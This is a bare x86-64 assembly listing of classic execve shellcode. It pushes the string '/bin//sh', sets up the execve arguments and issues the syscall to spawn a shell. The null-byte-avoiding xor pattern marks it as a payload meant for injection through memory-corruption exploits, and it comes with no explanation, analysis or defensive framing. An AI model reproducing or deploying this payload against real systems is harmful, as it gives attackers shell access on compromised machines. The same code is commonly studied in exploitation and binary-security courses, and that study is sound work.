.text
.global _start

_start:
	xor %rax,%rax
	push %rax
	movabs $0x68732f2f6e69622f,%rbx 
	push %rbx
	mov %rsp,%rdi
	xor %rdx,%rdx
	xor %rsi,%rsi
	mov $0x3b,%al
	syscall
